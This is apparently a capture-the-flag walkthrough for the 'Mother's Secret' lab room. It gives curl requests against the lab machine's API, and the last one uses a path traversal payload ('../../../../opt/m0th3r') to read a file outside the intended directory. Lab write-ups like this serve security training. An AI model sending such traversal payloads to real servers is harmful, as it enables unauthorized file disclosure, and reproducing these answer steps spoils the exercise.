# [Mother's Secret](https://tryhackme.com/r/room/codeanalysis)

```shell
export MACHINE_IP=x.x.x.x
```

Open http://$MACHINE_IP in a browser and keep it open as contents will change via websocket.

It is important to execute the requests in this order as server changes its internal state.

You can review the javascript code manually or use tools like [semgrep](https://semgrep.dev/) which will detect vulnerabilities about executing `fs.readFile` with a not sanitized `filePath`. 

**What is the special order number?**

```shell
curl -X POST -H "Content-Type: application/json" -d '{"file_path": "100375.yaml"}' http://$MACHINE_IP/yaml
```

**What is the hidden flag in the Nostromo route?**

```shell
curl -X POST -H "Content-Type: application/json" -d '{"file_path": "0rd3r937.txt"}' http://$MACHINE_IP/api/nostromo
```

**What is the name of the Science Officer with permissions?**
**What are the contents of the classified "Flag" box?**

Check the main page, contents should have changed. 

**Where is Mother's secret?**

```shell
curl -X POST -H "Content-Type: application/json" -d '{"file_path": "secret.txt"}' http://$MACHINE_IP/api/nostromo/mother
```

**What is Mother's secret?**

```shell
curl -X POST -H "Content-Type: application/json" -d '{"file_path": "../../../../opt/m0th3r"}' http://$MACHINE_IP/api/nostromo
```
